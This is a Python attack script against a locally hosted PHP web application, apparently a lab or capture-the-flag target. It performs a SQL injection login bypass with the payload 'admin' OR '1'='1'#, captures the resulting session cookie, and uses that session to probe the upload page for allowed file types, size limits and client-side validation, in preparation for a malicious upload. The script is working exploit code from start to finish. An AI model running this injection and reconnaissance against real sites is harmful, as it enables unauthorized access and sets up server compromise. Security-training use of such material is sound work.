import requests
from bs4 import BeautifulSoup
import re

# Step 1: SQL injection authentication bypass
login_url = "http://127.0.0.1:33210/index.php"
username_payload = "admin' OR '1'='1'#"
login_data = {
    "username": username_payload,
    "password": "dummy123",
    "submit": "Submit"
}

print(f"[*] POST {login_url}")
print(f"[*] Username payload: {username_payload}")
response = requests.post(login_url, data=login_data, allow_redirects=False)

phpsessid = None
if 'Set-Cookie' in response.headers:
    cookies_str = response.headers['Set-Cookie']
    match = re.search(r'PHPSESSID=([^;]+)', cookies_str)
    if match:
        phpsessid = match.group(1)
        print(f"[+] PHPSESSID: {phpsessid}")
        print(f"[+] Login response status: {response.status_code}")
        print(f"[+] Set-Cookie header: {cookies_str}")
    else:
        print(f"[-] PHPSESSID not found in Set-Cookie")
        print(f"[!] Headers: {dict(response.headers)}")
else:
    print(f"[-] No Set-Cookie header received")
    print(f"[!] Status: {response.status_code}")
    print(f"[!] Response body: {response.text}")

if not phpsessid:
    print("[-] Authentication bypass failed - no valid session")
    exit()

# Step 2: Access upload.php with authenticated session
upload_url = "http://127.0.0.1:33210/upload.php"
session_cookies = {'PHPSESSID': phpsessid}

print(f"\n[*] GET {upload_url}")
upload_response = requests.get(upload_url, cookies=session_cookies)
print(f"[+] Upload page status: {upload_response.status_code}")
print(f"[+] Content length: {len(upload_response.content)} bytes")
print(f"[+] Response body preview: {upload_response.text[:500]}")

# Step 3: Parse HTML for upload restrictions
soup = BeautifulSoup(upload_response.text, 'html.parser')

print(f"\n[+] HTML parsing results:")
print(f"[+] Page title: {soup.title.string if soup.title else 'No title'}")

# Find all forms
forms = soup.find_all('form')
print(f"[+] Forms found: {len(forms)}")

for idx, form in enumerate(forms, 1):
    print(f"\n[Form {idx}]")
    print(f"  Action: {form.get('action', 'Not specified')}")
    print(f"  Method: {form.get('method', 'Not specified')}")
    print(f"  Enctype: {form.get('enctype', 'Not specified')}")
    
    # Find input fields
    inputs = form.find_all('input')
    print(f"  Input fields ({len(inputs)}):")
    
    for input_idx, input_field in enumerate(inputs, 1):
        input_type = input_field.get('type', 'text')
        input_name = input_field.get('name', 'unnamed')
        input_accept = input_field.get('accept', '')
        input_maxlength = input_field.get('maxlength', '')
        
        field_info = f"    {input_idx}. Type: {input_type}, Name: {input_name}"
        if input_accept:
            field_info += f", Accept: {input_accept}"
        if input_maxlength:
            field_info += f", Max length: {input_maxlength}"
        print(field_info)

# Find file-specific restrictions
file_inputs = soup.find_all('input', {'type': 'file'})
if file_inputs:
    print(f"\n[+] File upload inputs found: {len(file_inputs)}")
    for idx, file_input in enumerate(file_inputs, 1):
        print(f"  File input {idx}:")
        print(f"    Name: {file_input.get('name', 'N/A')}")
        print(f"    Accept: {file_input.get('accept', 'Any type')}")
        print(f"    Max length: {file_input.get('maxlength', 'No limit')}")

# Search for size restrictions
size_patterns = ['max file size', 'max size', 'limit', 'maximum', 'mb', 'kb']
size_texts = []
for pattern in size_patterns:
    matches = soup.find_all(string=lambda text: text and pattern in text.lower())
    size_texts.extend(matches)

if size_texts:
    print(f"\n[+] Size/size limit mentions:")
    for text in size_texts:
        stripped = text.strip()
        if len(stripped) < 200:
            print(f"  - {stripped}")

# Search for file type restrictions
type_patterns = ['.jpg', '.jpeg', '.png', '.gif', '.pdf', 'image/', 'application/', 'allowed', 'only', 'supported']
type_texts = []
for pattern in type_patterns:
    matches = soup.find_all(string=lambda text: text and pattern in text.lower())
    type_texts.extend(matches)

if type_texts:
    print(f"\n[+] File type/extension mentions:")
    for text in type_texts:
        stripped = text.strip()
        if len(stripped) < 200:
            print(f"  - {stripped}")

# Find JavaScript validation
scripts = soup.find_all('script')
if scripts:
    print(f"\n[+] JavaScript blocks: {len(scripts)}")
    for script_idx, script in enumerate(scripts, 1):
        if script.string and len(script.string.strip()) > 10:
            content = script.string.strip()
            print(f"\n[Script {script_idx}] {len(content)} chars")
            print(content[:300])
else:
    print(f"\n[-] No JavaScript validation code found")

# Print complete form HTML
if forms:
    print(f"\n[+] Complete form HTML:")
    for idx, form in enumerate(forms, 1):
        print(f"\n--- Form {idx} HTML ---")
        print(str(form))

